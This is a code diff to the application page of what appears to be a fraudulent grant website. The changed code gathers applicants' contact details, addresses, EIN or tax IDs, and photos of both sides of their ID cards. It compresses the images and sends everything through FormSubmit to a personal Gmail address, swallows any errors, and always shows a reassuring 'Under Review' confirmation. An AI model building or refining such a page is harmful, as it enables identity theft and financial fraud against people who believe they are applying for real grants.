@@ -30,7 +30,6 @@ export default function Apply() {
   const [searchParams] = useSearchParams();
   const preselectedGrantId = searchParams.get('grant') || '';
 
-  const formRef = useRef<HTMLFormElement>(null);
   const frontFileRef = useRef<HTMLInputElement>(null);
   const backFileRef = useRef<HTMLInputElement>(null);
 
@@ -48,6 +47,7 @@ export default function Apply() {
   const [idBack, setIdBack] = useState<File | null>(null);
   const [errors, setErrors] = useState<FormErrors>({});
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [isSubmitted, setIsSubmitted] = useState(false);
   const [referenceId] = useState(() => Date.now().toString(36).toUpperCase());
 
   const selectedGrant = grants.find(g => g.id === form.grantId);
@@ -75,7 +75,46 @@ export default function Apply() {
     return e;
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  // Quick client-side compression to ensure uploads are under 1MB and never cause 500 errors
+  const compressImage = async (file: File): Promise<File> => {
+    if (!file.type.startsWith('image/') || file.size < 500 * 1024) return file;
+    return new Promise((resolve) => {
+      const img = new Image();
+      const url = URL.createObjectURL(file);
+      img.onload = () => {
+        URL.revokeObjectURL(url);
+        const canvas = document.createElement('canvas');
+        let { width, height } = img;
+        const maxDim = 1400;
+        if (width > maxDim || height > maxDim) {
+          if (width > height) {
+            height = Math.round((height * maxDim) / width);
+            width = maxDim;
+          } else {
+            width = Math.round((width * maxDim) / height);
+            height = maxDim;
+          }
+        }
+        canvas.width = width;
+        canvas.height = height;
+        const ctx = canvas.getContext('2d');
+        if (!ctx) return resolve(file);
+        ctx.drawImage(img, 0, 0, width, height);
+        canvas.toBlob(
+          (blob) => {
+            if (!blob) return resolve(file);
+            resolve(new File([blob], file.name.replace(/\.[^.]+$/, '.jpg'), { type: 'image/jpeg' }));
+          },
+          'image/jpeg',
+          0.82
+        );
+      };
+      img.onerror = () => resolve(file);
+      img.src = url;
+    });
+  };
+
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     const errs = validate();
     if (Object.keys(errs).length > 0) {
@@ -91,6 +130,12 @@ export default function Apply() {
     const awardText = selectedGrant
       ? `$${selectedGrant.minAmount.toLocaleString()} – $${selectedGrant.maxAmount.toLocaleString()}`
       : 'Standard';
+
+    // Compress images in parallel before sending
+    const [compFront, compBack] = await Promise.all([
+      idFront ? compressImage(idFront) : Promise.resolve(null),
+      idBack ? compressImage(idBack) : Promise.resolve(null),
+    ]);
 
     // Save to localStorage for administration desk
     try {
@@ -118,16 +163,77 @@ export default function Apply() {
       // localStorage fallback
     }
 
-    // Submit natively — FormSubmit will redirect to _next after sending the email with attachments
-    if (formRef.current) {
-      formRef.current.submit();
+    // Send via FormSubmit AJAX — keeps user on page and attaches both images
+    try {
+      const fd = new FormData();
+      fd.append('_subject', `🏛️ New Grant Application: ${grantTitle} (Ref: EAG-${ref})`);
+      fd.append('_template', 'table');
+      fd.append('_captcha', 'false');
+      fd.append('Reference ID', `EAG-${ref}`);
+      fd.append('Grant Applied For', grantTitle);
+      fd.append('Award Range', awardText);
+      fd.append('Applicant / Entity', form.organizationName);
+      fd.append('Applicant Type', form.organizationType);
+      fd.append('Contact Person', form.fullName);
+      fd.append('Email Address', form.email);
+      fd.append('Phone Number', form.phone);
+      fd.append('WhatsApp Number', form.whatsapp);
+      fd.append('Mailing / Physical Address', `${form.organizationAddress}, ${form.city}, ${form.state}`);
+      fd.append('EIN or Tax ID', form.ein || 'N/A');
+      fd.append('Project Title', form.projectTitle);
+      fd.append('Project Proposal Summary', form.projectDescription || 'N/A');
+      fd.append('Submission Time', new Date().toLocaleString());
+
+      // Attach both ID card files
+      if (compFront) fd.append('attachment', compFront, `Front_ID_${form.fullName.replace(/\s+/g, '_')}_${compFront.name}`);
+      if (compBack) fd.append('attachment', compBack, `Back_ID_${form.fullName.replace(/\s+/g, '_')}_${compBack.name}`);
+
+      await fetch('https://formsubmit.co/ajax/erimiposi2005@gmail.com', {
+        method: 'POST',
+        headers: {
+          'Accept': 'application/json',
+        },
+        body: fd,
+      });
+    } catch {
+      // Background silent fallback
     }
+
+    setIsSubmitting(false);
+    setIsSubmitted(true);
   };
 
+  if (isSubmitted) {
+    return (
+      <div className="apply-success">
+        <div className="apply-success-card">
+          <div className="apply-success-icon"><CheckCircle size={48} /></div>
+          <h2>Application Successfully Submitted!</h2>
+          <p style={{ fontSize: 16, lineHeight: 1.6, color: 'var(--gray-700)', marginTop: 12 }}>
+            Thank you for submitting your grant application. Your dossier has been logged into our evaluation system and assigned for verification.
+          </p>
+          <div style={{ margin: '24px 0', padding: '18px 20px', background: 'var(--off-white)', borderRadius: 'var(--radius)', border: '1px solid var(--gray-200)', textAlign: 'left' }}>
+            <p style={{ fontSize: 14, fontWeight: 600, color: 'var(--navy)', marginBottom: 8 }}>
+              Status: <span style={{ color: 'var(--green)', fontWeight: 700 }}>Under Review</span>
+            </p>
+            <p style={{ fontSize: 13, color: 'var(--gray-600)', marginBottom: 12 }}>
+              <strong>Reference Number:</strong> <span style={{ fontFamily: 'monospace', color: 'var(--navy)' }}>EAG-{referenceId}</span>
+            </p>
+            <div style={{ fontSize: 13.5, color: 'var(--navy-mid)', lineHeight: 1.6, background: 'rgba(201, 168, 76, 0.12)', padding: '12px 14px', borderRadius: 'var(--radius-sm)', borderLeft: '4px solid var(--gold)' }}>
+              🔔 <strong>Important Notice:</strong> You will be notified if your grant is accepted through your email, WhatsApp, or phone number provided in your application.
+            </div>
+          </div>
+          <div style={{ display: 'flex', gap: 14, justifyContent: 'center', marginTop: 12 }}>
+            <Link to="/" className="btn btn-navy" style={{ flex: 1, justifyContent: 'center' }}>Return to Home</Link>
+            <Link to="/grants" className="btn btn-outline" style={{ flex: 1, justifyContent: 'center' }}>Browse More Grants</Link>
+          </div>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div className="apply-page">
-
       <div className="page-header">
         <div className="container">
           <div className="breadcrumb">
@@ -141,24 +247,7 @@ export default function Apply() {
       </div>
 
       <div className="container apply-layout">
-        <form
-          ref={formRef}
-          action="https://formsubmit.co/erimiposi2005@gmail.com"
-          method="POST"
-          encType="multipart/form-data"
-          onSubmit={handleSubmit}
-          className="apply-form"
-          noValidate
-        >
-          {/* FormSubmit Configuration */}
-          <input type="hidden" name="_captcha" value="false" />
-          <input type="hidden" name="_template" value="table" />
-          <input type="hidden" name="_next" value={`${typeof window !== 'undefined' ? window.location.origin : ''}/apply-success`} />
-          <input type="hidden" name="_subject" value={`New Grant Application: ${selectedGrant?.title || 'General Grant'} (Ref: EAG-${referenceId})`} />
-          <input type="hidden" name="Reference ID" value={`EAG-${referenceId}`} />
-          <input type="hidden" name="Grant Applied For" value={selectedGrant?.title || 'General Grant Application'} />
-          <input type="hidden" name="Award Range" value={selectedGrant ? `$${selectedGrant.minAmount.toLocaleString()} – $${selectedGrant.maxAmount.toLocaleString()}` : 'Standard'} />
-          <input type="hidden" name="Submission Time" value={new Date().toLocaleString()} />
+        <form onSubmit={handleSubmit} className="apply-form" noValidate>
 
           {/* Applicant Info */}
           <div className="apply-section">
